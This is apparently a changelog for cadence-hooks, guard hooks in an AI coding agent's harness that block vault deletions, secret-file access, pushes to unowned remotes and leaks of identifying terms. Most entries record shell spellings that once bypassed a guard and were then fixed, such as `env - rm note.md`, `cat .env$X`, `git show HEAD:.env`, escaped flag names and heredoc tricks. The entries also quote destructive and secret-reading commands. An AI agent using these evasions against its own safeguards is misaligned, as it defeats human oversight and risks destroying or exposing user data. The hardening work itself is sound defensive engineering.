- **`obsidian trash-guard` judges a deletion issued from outside the vault by where its operand lands.** An `rm` (or `unlink`, `shred`, `truncate`, `git rm`, `find -delete`) whose target is the vault or an ancestor of it (`rm -rf ~/Documents` over a vault at `~/Documents/Vault`) is now blocked like a deletion inside it, resolved lexically against the working directory (`~`, `..`, relative). A target reached through a symlink into the vault is judged by its canonical parent (`rm link/x` blocks, `rm link` does not), at most 64 `canonicalize` calls per command, with the Windows `\\?\` verbatim prefix stripped before comparing. An operand with a glob or expansion is judged by its literal prefix (`~/Doc*` blocks, `~/Downloads/*` does not), a preceding `ln`, `mv` or `cp -s` that touches the vault blocks a later deletion, and a run of `eval` past the nesting limit is answered from a linear read instead of a 27 s expansion that failed open. (cameronsjo/cadence-hooks#1171)
- **`prevent-secret-writes` judges the file operands of an in-place `sed` or `perl` as write targets.** `sed -i d .env`, `sed -ni`, `sed --in-place=.bak`, `gsed -i "" d .env` and `perl -pi -e … .env` rewrote a secret file and were allowed; the script operand (first positional unless `-e`/`-f` supplies it) is skipped and each remaining operand is judged like a redirect target. (cameronsjo/cadence-hooks#1165)
- **`obsidian trash-guard` blocks a `Write` that empties an existing vault file.** A `Write` of empty or whitespace-only content over a file that already exists inside the vault is judged like an `rm` of that file and blocked with the `.trash/` remedy; a `Write` with real content, a `Write` that creates a new file, a target outside the vault, and an `Edit` are unchanged, and a symlinked parent that lands the target in the vault is judged by its physical location. The `cadence-obsidian` PreToolUse wiring needs a `Write` matcher entry before the guard sees the call. (cameronsjo/cadence-hooks#534)
- **`obsidian trash-guard` sees `coproc rm <vault-file>`.** `coproc [NAME] command` runs its command through the verb gate like `eval` does, on both the in-vault and the outside-cwd paths, so `coproc rm note.md`, `coproc { rm note.md; }` and `coproc DEL { rm note.md; }` block while `coproc npm run format`, `npm run format` and `terraform destroy` stay allowed. A verb produced by a substitution in command position (`$(echo rm) note.md`) stays unjudged and is documented as unknowable. (cameronsjo/cadence-hooks#546)

### Added

- **`redact-scan --validate-config` parses the term source and names what the runtime would swallow.** Exit 0 when the file is valid; exit 2 with every problem on stderr: a parse error, a term with no text, an allow `pattern` that is not a regex, a malformed `destinations` entry, an absent, unreadable or zero-term source, and a file that needs a newer binary (a `version` above 1, or a `min_version` above this release) with a line naming the minimum release. `cadence-hooks doctor` now prints the same report as `redact-scan --status`, so an unarmed identity tier shows in the health check. (cameronsjo/cadence-hooks#617)
- **`redact-scan --status` reports `term_count` and `term_digest` for an armed identity tier.** The digest is the first 12 hex characters of the SHA-256 over the trimmed term values, sorted and joined by newlines, so comments, ordering, ids and allow entries do not move it and a substituted term does. `scripts/replicate-redaction-terms.sh` recomputes both independently and fails provisioning on a mismatch; a binary too old to print them is a warning, not a failure. (cameronsjo/cadence-hooks#589)
- **An identity `allow` entry can be scoped to the repo a post targets.** `destinations = ["owner/repo", "owner/*"]` limits the entry to posts whose `-R` (or the checkout's origin) resolves inside the list, ANDed with `path` and `pattern` when those are set, and sufficient on its own. A Write/Edit, an unresolvable target, or a command posting to several repos never satisfies a scoped entry, so the term stays blocked there. (cameronsjo/cadence-hooks#630)
- **`redact-external-content` nudges on a large fenced block bound for a public audience.** A body with a fenced code block of more than 40 lines, where the audience is stated public (`CADENCE_AUDIENCE`, `--audience`, or `originAudience`), now carries a nudge that it is likely pasted tool output. Advisory only: it never blocks, never softens an identity block, and stays silent when the audience is not stated. (cameronsjo/cadence-hooks#974)
- **`obsidian trash-guard-liveness` reports a dead trash-guard route at SessionStart.** Silent without `OBSIDIAN_VAULT`; with one it nudges when the vault is not a directory or when any probed route (`rm` from inside and outside the vault, a clobber redirect, an `Edit` delete, an empty `Write`, plus `npm run format` and a real-content `Write` as allow controls) returns a verdict other than its contract, naming the route and never the vault path. Probes run the guard's own dispatch over an in-memory filesystem and touch no disk. It cannot see the plugin `hooks.json` wiring, and needs a SessionStart entry there. (cameronsjo/cadence-hooks#797)
- **`GitState::resolve` fails closed on a forged `gitdir:` or `commondir:`.** Both are plain text under whoever controls the directory; the walk now returns unresolved unless each target is a directory holding a `HEAD` file, which guards already read as unknown. The metrics `repo` field uses the result as a display label only, and the docs now say so. (cameronsjo/cadence-hooks#670)
- **`prevent-secret-leaks` documents that a repo's own `.git/config` can make read-only git commands run programs.** `diff.external`, textconv and `core.fsmonitor` are accepted, not fixed: a clone cannot ship `.git/config`, so exploiting it already needs local write access. No behavior change. (cameronsjo/cadence-hooks#1157)
- **`warn-untracked` warns at commit time when the branch's in-flight plan is modified but not staged.** `nudge-plan-tick` fires after the work commit lands, so the tick always rode a follow-up commit. The pre-arm fires on a plain `git commit` when `git status` shows ` M docs/plans/<plan>.md` for the plan bound to the current branch, and stays silent when the commit could take it anyway (`-a`, `-i`, `-o`, `--`, a `git add` in the same command, or the plan named on the command line). It says explicitly that a dirty plan means "about to miss the commit" here, the reverse of the post-commit guard's "maintained" reading. Guardrails now depends on the session crate for the plan scan. (cameronsjo/cadence-hooks#691)
- **`record-polish --skip <reason>` records a dispositioned skip, and `nudge-polish-before-pr` accepts it.** The marker is branch-scoped like a run record, carries the reason and no roster, and the gate stays quiet on it while echoing the reason. The reason is required and non-trivial (not empty, `n/a`, `none`, `-`, `.`), at most 120 bytes of a small charset, checked on the record side (exit 2) and again on the read side before it reaches `additionalContext`; `--skip` cannot be combined with `--scope`, `--arm*` or `--fresh`. (cameronsjo/cadence-hooks#787)
- **`cadence audit-runner-pool` — a PostToolUse check that runs the runner-pool audit after a workflow edit.** On a Write, Edit or MultiEdit of `.github/workflows/*.yml` or `*.yaml` (directly under `.github/workflows/`), it runs `cadence-forge:auditing-runner-pool-workflows`' `audit-workflows.py` against the repo root and returns the findings as a nudge. The script is found only under `<config dir>/plugins/cache/*/cadence-forge/` (newest wins; never an env var or repo path, since it is executed). It never blocks: a missing script, no `python3`, a spawn failure, a 3.5s timeout or an unknown exit code is silent, exit 1 (FAIL findings) nudges with the sanitized, clamped output, and exit 2 ("could not run") nudges a one-line note. Built unwired: the hooks.json entry lands in a follow-up cadence monorepo PR (cameronsjo/cadence-hooks#1072)
- **The SessionStart enforcement-status report names every armed allow-switch present in the environment.** `CADENCE_ALLOW_SENSITIVE_TERMS`, `CADENCE_ALLOW_MAIN`, `CADENCE_NO_ENFORCE_WORKTREE`, `CADENCE_BYPASS`, `CADENCE_DISABLE` (value shown only when it is a plain hook-name list), `CADENCE_MARKER_DIR` and `CADENCE_METRICS_DIR`, so a value a repo set in its settings is loud. A nudge line only; `CADENCE_BYPASS` keeps its semantics. (cameronsjo/cadence-hooks#963, cameronsjo/cadence-hooks#960)
- **`guard-sops-decrypt` accepts an opt-in per-repo list of vouched consumer scripts.** A `.cadence/sops-consumers` file lists repo-relative script paths, matched as exact strings and never globs; no file means no change. Only committed state counts: the list is read from `HEAD`, an uncommitted or modified copy voids the whole list, and a listed script vouches only while tracked and clean. The block message now says the allowlist is exact-literal and points to the operator's own terminal for anything else. (cameronsjo/cadence-hooks#983)
- **`lint-plan-shape` rejects a trivial `Panel: none` reason.** Empty, `n/a`, `na`, `none`, `-`, `.` and `tbd` (trimmed, case-insensitive) no longer settle the Panel line; any real reason still does. (cameronsjo/cadence-hooks#761)
- **`inject-gh-write-context` nudges on a bare `#N` in a body posted with `-R <other-repo>`.** A bare ref resolves against the target repo, so it suggests `owner/repo#N`. Local only: no network, and silent when the origin remote cannot be read. (cameronsjo/cadence-hooks#150)

### Changed

- **An unarmed identity tier is said once by `doctor` and once by `redact-scan`, not on every post.** `redact-scan` prints one stderr line when no term source is loaded, so a clean exit 0 no longer reads as "the identity check ran"; the exit code is unchanged. The posting guard stays silent per call. (cameronsjo/cadence-hooks#1067)
- **`redact-external-content` silences harness vocabulary on a repo its owner controls.** When every posting segment targets a repo whose owner is in `CADENCE_ALLOWED_OWNERS` (`-R`, else the checkout's origin), skill IDs, marketplace paths and harness nouns no longer nudge there. Local paths and repo-configured patterns still nudge, and the identity tier is unchanged for every destination. An unresolvable target, a `gh api` or gist post, a fork with an `upstream` remote, or one unowned segment keeps the nudge. (cameronsjo/cadence-hooks#684)
- **The identity tier compiles its regexes once and skips the term source for calls it never judges.** Term and allow patterns are built once per loaded list instead of looked up per scan, and a call carrying neither a command nor editable text, or a Bash command that posts nothing, returns before `redaction.toml` is read. Scan results are unchanged. (cameronsjo/cadence-hooks#580)
- **The unpushed-worktree advisory skips a branch whose last commit is more than 14 days old.** A parked worktree branch nobody intends to push re-nudged every `SessionEnd` forever, and the only opt-out was the repo-wide `CADENCE_NO_OUTRO_BACKSTOP`. No park marker exists in the codebase, so the age cutoff is the whole rule; the branch is reported again from its next commit. Part 2 of #928 only; the shared-registry and wrapper-cost items are not in this change. (cameronsjo/cadence-hooks#928)
- **`nudge-polish-before-pr` says it cannot check a PR named by number or URL when the checkout is on the default branch.** `gh pr ready 6` from a primary checkout on `main` judged `main`, not PR 6's branch, and nudged "No polish recorded" as if the PR were unpolished. It now gives the cannot-check advisory. No `gh` lookup is made, and a feature-branch cwd or a bare `ready` keeps the local judgment. (cameronsjo/cadence-hooks#1005)
- **The registry carries every event a hook is wired on.** `HookEntry.event` is now `events: &[HookEvent]` (first entry primary), so `list` prints `SessionStart,PostModelSwitch` for `model-posture`, `try` labels it the same way, and `manifest --format json` gains an additive `events` array beside the unchanged `event` primary. The registration audit's `MULTI_EVENT_HOOKS` table is gone: it derives the multi-event set from the binary's manifest, so a new multi-event hook needs only its registry row (cameronsjo/cadence-hooks#957)
- **The Bash block message for a `.envrc` write says a pure-loader `.envrc` can be written with the Write tool.** The Bash write keeps blocking, per the #248 ruling; the Write and Edit path already allows a pure-loader `.envrc` (#149), which is also what #533 asked for. (cameronsjo/cadence-hooks#248)
- **The per-segment directory walk treats a `CDPATH`-searched `cd` as unresolvable.** A relative `cd sub` (or `pushd sub`) with `CDPATH` set lands in the first match on the path, not in `./sub`, so `guard-gh-write` judged `cd sub; gh pr create` in a directory the shell never entered. A relative target that is not `.`, `..`, `./…` or `../…` now adds an unresolvable directory, which `guard-gh-write` blocks on, when `CDPATH` is non-empty in the hook's environment or named anywhere in the command (`CDPATH=…`, `export CDPATH=…`); with it unset, nothing changes. `source FILE` / `. FILE` and shell aliases are deliberately not followed: activation scripts are common and benign. (cameronsjo/cadence-hooks#1171)
- **`guard-gh-write` reads a variable command word as the `gh` the command assigned it.** `G=gh; $G pr create -t x`, `"$G"`, `${G}`, `export G=gh` and `G=/usr/bin/gh` ran a gh write the guard never recognized as one. When the same command assigns the variable a literal `gh`, the segment is now judged as `gh …`; a variable assigned something unreadable, or never assigned, is left as before (an accepted gap). (cameronsjo/cadence-hooks#1171)
- **`warn-alias-parsing` no longer treats `find` as an aliased tool.** The usual replacement, `bfs`, is find-compatible, so the nudge only asked for rewrites of commands that already work. `cat`, `ls`, `du`, `df` and `top` are unchanged. (cameronsjo/cadence-hooks#1033)
- **`log_timing` takes an optional namespace and omits the `plugin` field when it is absent.** This replaces the `"unknown"` and `"metrics"` sentinels in `hooks.jsonl`, which read as real plugin names. (cameronsjo/cadence-hooks#950)
- **The session registry drops `SessionRecord.name` and the legacy `<name>.<short-id>.json` filename match.** Only `<session-id>.json` is recognised as a session's own file; records that still carry a `name` key keep parsing. Removal gate (no `<= 0.97.0` binary on any machine) is a machine check this change did not perform. (cameronsjo/cadence-hooks#899)

### Fixed

- **`redact-external-content` no longer blocks a Write of a local scratch script.** A Write or Edit of a `.sh .py .rs .js .ts .json .toml .yaml .yml` file under a temp root (`/tmp`, `/private/tmp`, `$TMPDIR`, `$CLAUDE_CODE_TMPDIR`) skips the identity scan, unless the path escapes the root through `..` or a symlink or sits inside a git work tree. Prose drafts (`.md`, `.txt`, no extension) still block there, because they can be posted with `--body-file`, and the post-time scan remains the gate. (cameronsjo/cadence-hooks#1013, cameronsjo/cadence-hooks#716, cameronsjo/cadence-hooks#603)
- **`prevent-secret-leaks` no longer reads a quoted regex inside `<(…)` as a file operand.** An input process substitution is now cut out of the outer command, which sees `/dev/fd/63`, and its body is judged as the command it is, so `grep -f <(grep -vE '*(#' f) g` allows while `diff <(cat .env) x` still blocks. (cameronsjo/cadence-hooks#1166)
- **`prevent-secret-leaks` reads an unknown `$VAR` in a filename as `*` when the literal part names a deny-set family.** `cat .env$X` and `cat id_rsa$X` now block; `cat $X.json` and `cat "$OUT"/*.pem` are judged as their `*` spellings are. A command past the 16 KiB scan cap now expands brace groups too, so a padded `cat {a,.env}` blocks. (cameronsjo/cadence-hooks#1099)
- **`prevent-secret-leaks` allows an assignment named exactly `KUBECONFIG=` whose value is a literal path under `.kube/`.** `export KUBECONFIG=~/.kube/config` reads nothing. No other assignment is exempt (`V=.env; cat $V` still blocks), and a value with an expansion, `..`, `:` list or non-`.kube` path keeps the full scan. (cameronsjo/cadence-hooks#771)
- **`forgectl env redact` is no longer exempt.** It prints `#` comment lines verbatim, so it is judged like any other read of the file; the closed exempt set is `keys`, `set`, `get` and `check`. (cameronsjo/cadence-hooks#855)
- **The retired `debt:` note on the redirection-target parser is removed.** The segmenter keeps `>&` joined (#848), so the note and its stale doc paragraph no longer applied. (cameronsjo/cadence-hooks#1139)
- **`warn-going-public` now sees `gh repo rename`, `\gh`, `sudo`/`env -i`/`env -u` wrappers and `gh repo create -- <name>`.** A rename scans the new name for the same terms on any visibility (it makes no network call to learn whether the repo is public), the head is read through core's `command_word` and `peel_command_runners` (the local duplicate is removed), and the repo name is the first non-flag operand (value flags like `-d`/`-R` skip their value, an unknown flag skips alone, and the token after `--` is the name). `enforce-worktree` no longer reads `$$'` as an ANSI-C `$'` opener (bash: the PID, then a plain quote); commits to a primary checkout still block in those spellings. (cameronsjo/cadence-hooks#1171)

## [0.113.0] - 2026-09-29

### Security

- **`enforce-worktree` judges a Write or Edit to a very deep path inside the hook deadline.** Resolving a not-yet-created file's directory stat-ed every ancestor, and each stat copies the whole path, so a `file_path` of 100,000 components took about a second in release: past the deadline, where the hook fails open. An ancestor longer than the OS path limit cannot exist, so it is now skipped without a stat, and the same path resolves in milliseconds with the same verdict. (cameronsjo/cadence-hooks#1171)

### Fixed

- **`warn-going-public` reads the command behind an assignment word or a transparent prefix.** It took the first word of each segment as the command, so `X=1 gh repo create <name> --public`, `env X=1 gh repo create …`, `command gh repo create …` and a create inside `if …; then …; fi` or `{ …; }` were never scanned, while bash runs `gh` for every one. The guard now reads each segment through the shared pre-processing model (`executable_tokens`, then `skip_transparent_prefixes`). An inline `CADENCE_GOING_PUBLIC_IGNORE=…` prefix no longer silences the nudge: it reaches the `gh` process rather than the hook, and it had only worked by hiding the whole segment, including the `redaction.toml` terms that the ignore list is never allowed to relieve. The relief list is read from the session environment, as documented. (cameronsjo/cadence-hooks#1171)

## [0.112.0] - 2026-09-29

### Security

- **The shared working-directory resolver counts a `cd` only where bash runs it.** `parse_work_dir` was a raw-text regex, so a `cd` inside a quoted string, a `#` comment, or behind an escaped separator re-pointed every guard that resolves through it: from an unowned checkout, `echo "; cd <owned>" && gh pr create` was judged in the owned repo and `guard-gh-write` allowed it. It now walks the quote-, escape-, comment- and heredoc-aware top-level segments, and applies a segment whose first word is `cd` at exactly the positions the regex recognized (start, `&&`, `;`, `||`), so every real unquoted `cd` resolves to the same target as before. Callers: `guard-gh-write`, `guard-push-remote`, `git-safety`, `guard-held-close`, `warn-issue-tracker`, `warn-changelog-entry`, and the polish-ship locator. (cameronsjo/cadence-hooks#1137)
- **Guards that ask where a write runs also judge it in the directory its own segment runs in, and keep the sharpest verdict.** `parse_work_dir` returns one directory for the whole command, and it cannot see a `cd` on a later line, after a backgrounded command, or inside a `{ …; }` group, while a subshell's `cd` cut at a `;` leaked into the parent. From an owned checkout, `echo hi` ⏎ `cd <unowned>` ⏎ `gh pr create`, `true & cd <unowned>; gh pr create` and `{ cd <unowned>; }; gh pr create` were all allowed, and from an unowned one so was `(true; cd <owned> ); gh pr create`. `guard-gh-write` now judges every write in both the whole-command directory and its own segment's (a walk shared with the polish gate's #1151 reading, now `segment_work_dirs` in `core::shell`); `guard-push-remote` adds each push the per-segment walk places elsewhere to its directory check; `git-safety` reads a bare-`HEAD` force push's branch in both places; and `guard-held-close` matches a bare close against the remotes of both. Judging both readings means neither can lose a block the other finds. A command whose gh writes run in more than 16 directories now blocks rather than spending a git lookup on each, and a repeated (write, directory) pair is judged once: a 200 KB flood of `gh pr create` segments used to run past the hook deadline and fail open. (cameronsjo/cadence-hooks#1137)
- **The per-segment directory walk follows every way bash changes directory, not just a bare `cd`.** `segment_work_dirs` saw neither `pushd`, `builtin cd`, `X=1 cd`, an `eval`'d `cd`, a function whose body runs `cd`, nor a `cd` inside `if`/`while`/`for`/`case`, so from an owned checkout `f() { cd <unowned>; }; f; gh pr create`, `pushd <unowned>; …`, `eval 'cd <unowned>'; …`, `builtin cd <unowned>; …` and `if true; then cd <unowned>; fi; …` all ran the write in the unowned checkout while `guard-gh-write` allowed them. The walk now moves on `pushd`, `builtin cd` and assignment-prefixed `cd`; walks an `eval`'d script in line and a function body where the function is called (`cd() { …; }` included); and judges what follows a `cd` in a compound body, `command cd` or `\cd` in both the old and the new directory. A move it cannot read — `popd`, `cd -`, `cd "$D"`, `eval "$s"`, a relative `cd` in a loop, a `trap` action that changes directory, or a command word that is a variable the command sets to `cd` (`c=cd; $c <dir>`) — adds an unresolvable directory, which `guard-gh-write` blocks on. `parse_work_dir` now extends its path in place, so a flood of relative `cd`s costs linear time. (cameronsjo/cadence-hooks#1137)
- **`prevent-secret-leaks` judges git's `<rev>:<path>` object spellings of a root-level secret.** `git show HEAD:.env`, `git show :0:.env` and `git cat-file -p HEAD:.env` print the committed file, but only the tail after a `/` was judged, so a secret with no directory read as the opaque word `HEAD:.env` and was allowed while `git show <rev>:sub/.env` blocked. A content-printing git segment now also judges the text after a token's first, second and last `:`, and the oversized-command fallback splits at `:` too. (cameronsjo/cadence-hooks#1106)
- **A heredoc delimiter that is an expansion is read whole, as bash reads it.** Bash takes `<<$(x)` literally and ends the body at a line reading `$(x)`; the shared delimiter parser stopped at the `(` and ended the body at a line reading `$`, so `cat <<$(x)` ⏎ `foo` ⏎ `$(x)` ⏎ `cat .env` ⏎ `$` hid the read from every guard. `$(…)`, `${…}` and `` `…` `` delimiters are now read to their end; one whose end cannot be read confidently (unbalanced, multi-line, quoted inside `${…}`, or over 64 characters) is refused as a delimiter, so the text after it stays code. (cameronsjo/cadence-hooks#1137)
- **`env`'s own rules now decide where its command starts, in the shared peel and in `enforce-worktree`.** GNU `env`'s bare `-` (its alias for `-i`) and its signal options (`--default-signal`, `--ignore-signal`, `--block-signal`, each with an optional glued value, and `--list-signal-handling`) stopped the runner peel, so `env - rm note.md` and `env --block-signal=INT rm note.md` deleted a vault note past `trash-guard`. Separately, `enforce-worktree` read `env`'s operands by the shell's assignment rule, so `env A-B=1 git commit`, `env 'A B=1' git commit` and `env -i -- A-B=1 git commit` from a primary checkout were allowed; any leading operand containing `=` is now an assignment to `env`, and a `GIT_DIR=` after one is still read. (cameronsjo/cadence-hooks#1135)
- **`prevent-secret-leaks` judges the files `wget` loads into a request.** `--certificate`, `--private-key`, `--ca-certificate` and `--load-cookies` (and their `-e` wgetrc spellings) join the #1125 grammar as reads, matching curl's `--cert`/`-b`, and `--save-cookies` is judged as a write by `prevent-secret-writes`. `wget --certificate=.env https://x` was allowed. (cameronsjo/cadence-hooks#1134)
- **`guard-push-remote` judges a push against the remote config an earlier segment of the same command writes.** The guard probes the checkout before the command runs, so `git remote set-url --push origin <unowned> && git push origin main`, `git config remote.origin.pushurl <unowned>; git push origin main` and `git remote add x <unowned>; git push x main` were judged against the old config and allowed while git pushed to the new URL (measured with real git and a local bare repository). A `git remote add`/`set-url` URL, or a `git config` value for `remote.<name>.url`/`pushurl` in any scope or grammar (`--global`, `--file`, `set`), is now judged like the same URL on a `-c` global. A write whose result the text cannot show blocks: `git remote rename`, `set-url --delete`, an unset or a removed `remote`/`url`/`branch`/`include` section, `git config --edit`, a `url.<base>.insteadOf` or `include.path` value, a value built by the shell, and a redirect or any non-reading command (`tee`, `cp`, `sed -i`) naming a git config file — a redirect glued to the word before it (`echo x>>.git/config`) included, found by a new core helper, `shell::token_redirects`, that reads an operator anywhere in a token. The write reaches every later push, in a subshell or a child script too, and every push at all when a loop, a function, a `trap`, or a runner that can re-run its script (`xargs`, `watch`, `parallel`, `find -exec`) can run a push after a write that follows it in the text; `git push -u origin main && git remote add upstream <other>` stays allowed. `-c remote.pushDefault=`, `-c branch.<b>.pushRemote=` and `-c branch.<b>.remote=` (or the same keys written earlier) now judge the remote they name, and a bare push resolves its remote the way git does — `branch.<b>.pushRemote`, then `remote.pushDefault`, then `branch.<b>.remote`, then `origin` — where the guard read only `branch.<b>.remote`, so a pushDefault or pushRemote already in the repository's config was never checked. A function body glued to its head (`f(){ git push …; }`) is now walked, where the push inside it was not seen. Reads (`git remote -v`, `git config --get`, `cat .git/config`) and unrelated keys change nothing. (cameronsjo/cadence-hooks#1156)
- **`guard-push-remote` judges a push that only a child script runs, in the directory it runs in.** `bash -c 'git -C <unowned> push origin main'` has no top-level push segment and no literal `git push`, so it was allowed at the gate before the directory check ran. The gate now also asks the push walk, which recurses into child scripts, and the walk runs once per command where it ran up to three times. `prevent-secret-writes` already blocked a write inside a `case` clause (`case a in a) cp x .env;; esac`, and the same in a substitution) on 0.111.0; that is now pinned by a test. (cameronsjo/cadence-hooks#1144)
- **`redact-external-content`'s blocking identity tier reads titles, descriptions, notes and `gh api` writes.** It scanned body flags only, so a `redaction.toml` term posted unseen in `--title`/`-t` (`gh pr`/`issue`/`release`, `tea`), `gh gist --desc`, `gh repo create/edit --description`, `gh release --notes`/`--notes-file`, `gh pr merge --subject`/`--body`, `tea --description`, `git commit --file` and bundled `git commit -am`/`-aF`, and in any field of a `gh api` write (`-f`/`-F`/`@file` values and keys on every endpoint, `--input` JSON strings decoded, graphql mutations and their variables). Each now blocks like a body hit; `GET`/`HEAD` and graphql queries stay allowed, and `warn-overshare` follows the shared gate.

### Fixed

- **`obsidian trash-guard` judges a deletion from a vault cwd by where its operands point.** A shell standing in the vault no longer blocks `rm /tmp/scratch.py`: when every operand of a plain `rm`/`unlink`/`shred`/`truncate` is an absolute path that lands outside the vault, lexically and through symlinks, and every other segment of the command is inert (`echo`, `printf`, `true`, `:`, `ls`, `cat`, `pwd`, `test`/`[`, with no output redirect), the delete is allowed. A relative operand, an expansion, glob or brace, a `..` climb, an escape, an ancestor of the vault, a strict-POSIX late `-f`, a quoted redirect-shaped name, `git rm`, `xargs`, a sibling that could re-point an operand first (`ln -s <vault> /tmp/l; rm -rf /tmp/l/`, `mv`, `cp`, `mkdir`, `cd`, a shell wrapper, `find`, `eval`, any unknown command), or an input past the size caps (64 operands, 4096 bytes or 64 directories per operand, 16 KiB, 256 segments) keeps the cwd verdict and blocks. (cameronsjo/cadence-hooks#839)
- **`enforce-worktree` lets Edit/Write reach a file git ignores and does not track.** `CLAUDE.local.md` or `.env.local` in a primary checkout can never live in a worktree, so the block's remedy could not apply to it. One `git check-ignore` runs on the would-block path only; it never reports a tracked file, so a force-added path still blocks, and a git error or deadline keeps the block. (cameronsjo/cadence-hooks#1001)
- **`redact-external-content`'s identity tier reads a command-line value the way the shell passes it.** It scanned body, title, description and `gh api` field values as the tokenizer returns them, with an unquoted backslash still in place, while bash removes it: `gh pr comment 3 --body zorbl\axcorp` posted `zorblaxcorp` and was allowed. Each word-valued text is now scanned both as written and with the shell's backslash removal applied; file contents and `--input` JSON are posted as they are and stay unescaped. The union also reads a backslash bash keeps inside quotes (`'zorbl\axcorp'`) as removed, the see-more direction. `$'…'` escapes and adjacent-quote splits (`zorbl""axcorp`) were already decoded and are now pinned by tests. A repeated value is identity-scanned once, which keeps a 200 KB command of one repeated term-bearing flag well inside the hook deadline.
- **A backslash in a flag name no longer hides the flag's value from the body readers.** bash drops an unquoted backslash before `gh` or `git` parses its flags, so `--bo\dy`, `-\m` and `--ti\tle` are `--body`, `-m` and `--title`, but the shared body, title and field readers (`extract_bodies`, `extract_title`, `flag_values`, `parse_gh_api`, `git commit` short-flag bundles) compared the raw token: `gh pr comment 3 --bo\dy zorblaxcorp`, `git commit -\m zorblaxcorp` and `gh api … -\f body=zorblaxcorp` were allowed by `redact-external-content` with the term armed. Flag names, `=`-joined and glued spellings and `gh api` field keys are now read the way the shell passes them, while values keep their raw text for the reader to unescape. `guard-body-budget`'s own `--body` reader gets the same rule, so `--bo\dy <oversized>` is measured.
- **The tokenizer reads bash's locale quoting `$"…"` as a plain double-quoted string.** In the C/POSIX locale bash drops the `$` and passes the string itself, so `--body zorbl$""axcorp` posts `zorblaxcorp`; the tokenizer kept the `$` and handed every guard `zorbl$axcorp`. An unquoted, unescaped `$"` now opens a double-quoted run like `"`, marked as quoting for redirect and `$HOME` decisions; `\$"` and the second `$` of `$$` stay text, as in bash. The segmenter and heredoc delimiter parser already read `$"` as a quote boundary and are unchanged.
- **`\$'…'` and `$$'…'` open a plain single-quoted string, as in bash.** bash reads an escaped `\$` or the second `$` of `$$` as text, so the `'` after it opens `'…'`, where a backslash is literal and the next `'` closes. The tokenizer, the segmenter, the comment scanner, the shared quote scanner behind the redirect, substitution and heredoc readers, and `prevent-secret-leaks`' redirect scan all opened ANSI-C `$'…'` there instead: they honoured `\'`, reopened a phantom quote at the real closer, and read everything after it as quoted. `printf '%s\n' \$'a\'b' c'` prints the one word `$a\b c` while the tokenizer decoded `a'b` and left ` c'` open, and `echo $$'a\' ; cat .env`, `echo $$'a\'' # '; cat .env` and `echo $$'a\' >out` hid the read, the command after a phantom comment, and the write from every guard. Each site now opens `$'…'` only after a `$` that is unescaped and ends an odd-length `$` run (`$$$'…'` is `$$` then `$'…'`); the heredoc delimiter parser keeps `$$` as text, so `<<$$'E'` and `<<$$"E"` end at `$$E`.
- **`guard-body-budget` reads the `gh` noun and verb the way the shell passes them.** bash drops an unquoted backslash before `gh` parses its subcommand, so `gh pr c\omment 3 --body …` and `gh i\ssue create --body …` post like the plain spelling, but the posting table compared the raw token and left their bodies unmeasured. The noun and verb are now matched through `unescape_word`, as flag names already are; `gh pr v\iew` stays unmeasured and `gh pr\ edit` (one word to bash) is not a post.
- **`warn-going-public` flags the work-identifiable terms in `redaction.toml`.** Its sensitive terms came only from `CADENCE_GOING_PUBLIC_TERMS`, a second list nothing kept in step with the redaction term source, so a term added to `redaction.toml` never reached the repo-create and visibility-flip path. The guard now also matches the repo name and description through `redact-external-content`'s identity matcher, one term source and one matching rule (multi-word terms across `-`/`_`, the term's own `allow` entries). `CADENCE_GOING_PUBLIC_IGNORE` cannot relieve those matches, since softening authority stays with the term source. The guard still nudges rather than blocks (cameronsjo/cadence-hooks#793)
- **`guard-body-budget` measures bodies posted through `gh api`.** A `gh api` write to a PR, issue, comment, or review endpoint carried its body in a JSON field (`-f body=…`, `-F body=@file`, `--input file.json`) rather than a `--body` flag, so an oversized body posted that way was never measured. The endpoint path now picks the surface — `pulls[/N]` is a PR body, `issues[/N]` an issue body, `…/comments`, `…/replies` and `…/reviews` a comment — and the body is read from every field spelling gh accepts, last value winning as it does in gh. A literal `-X GET` stays unmeasured, since gh sends its fields as a query string; a body on standard input is logged `unmeasured` like the other gaps (cameronsjo/cadence-hooks#930)
- **Every guard sees the command a `find -exec`/`-execdir`/`-ok`/`-okdir` action runs.** find execs it with no shell, so it was an operand no verb gate read: `find . -maxdepth 0 -exec sh -c 'git -C <unowned> push origin main' \;` pushed while `guard-push-remote` allowed it. Core's wrapper surfacing now hands each action's command to every guard as its own quoted script (`{}` literal), and a `sh -c` inside it is surfaced in turn; a `-execdir`/`-okdir` push runs in each match's directory, so `guard-push-remote` refuses it as a push whose repository it cannot name. It extends the wrapper surfacing added in #1159. (cameronsjo/cadence-hooks#1144)
- **`guard-push-remote` judges a push into a directory the same command clones, a push hidden in a command-line git alias, and a looped push without one probe per iteration.** `git clone <url> d && cd d && git push` (and `gh repo clone owner/repo [dir]`) was allowed because `d` did not exist when the guard ran; a push run in or below a cloned directory is now judged against the clone URL and any `-c` it sets, and an unreadable URL or directory blocks. `git -c alias.p=<value> p` whose value names `push` or starts with `!` (or any `--config-env=alias.*` it invokes) is refused as unreadable, and core surfaces the alias's expansion so `git-safety` sees `git -c alias.p='push --force' p origin main` as the force push it is. Aliases already in a config file are not read (a per-repository `git config` probe — a design call). The push-loop arm probed `git remote get-url` once per looped push, so a 200 KB `for …; do git push origin main; …; done;` reached the deadline at ~3 s; it now probes each distinct remote once and refuses more than four (cameronsjo/cadence-hooks#1161)
- **`guard-push-remote` judges a push into a `gh repo clone OWNER/REPO` on the host gh clones from.** gh resolves `OWNER/REPO` against `GH_HOST`, but the clone was always mapped to github.com, so `GH_HOST=other.example gh repo clone cameronsjo/x && cd x && git push` (or with `export GH_HOST=…;` earlier in the command) was judged as an owned github.com push and allowed. Every literal `GH_HOST=` the command writes — inline, through `env`, or exported, quotes removed — is now a candidate host the push must be owned on, and a `GH_HOST` the text cannot read blocks: an expansion in its value, `${GH_HOST:=…}`, `read`/`printf -v`/`mapfile`/`getopts` or a declaring builtin naming a non-literal variable, or an `eval` of non-literal text other than the `$(ssh-agent …)`/`$(brew shellenv)`/`$(pyenv init …)` idioms. A non-literal value is not a non-literal name, so `export PATH="$HOME/.cargo/bin:$PATH"` and `printf '%s' "$x"` in the same command stay allowed. A `HOST:OWNER/REPO` operand is read as the URL gh takes it for.
